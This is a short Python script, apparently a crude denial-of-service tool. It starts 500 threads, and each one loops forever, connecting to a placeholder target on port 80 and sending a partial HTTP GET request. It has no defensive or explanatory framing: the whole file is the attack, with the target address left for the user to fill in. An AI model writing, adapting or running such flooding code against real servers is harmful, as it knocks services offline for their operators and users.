import socket
import threading

target = 'ip addr'
port = 80

num = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),
                 (target, port))

        global num
        num += 1

        s.close()


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
